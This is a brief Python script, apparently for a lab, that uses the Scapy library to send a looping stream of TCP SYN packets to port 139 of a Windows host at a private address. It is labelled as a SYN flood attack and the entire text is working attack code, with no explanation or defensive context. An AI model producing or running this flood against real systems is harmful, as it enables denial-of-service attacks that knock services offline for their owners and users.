#SYN FLOOD ATTACK ON WINDOWS MACHINE

import sys
from scapy.all import *

packet= IP(dst="10.10.111.100")/TCP(sport=RandShort(),dport=139,flags="S")
ans,uans = srloop(packet,inter=0.2,timeout=4)

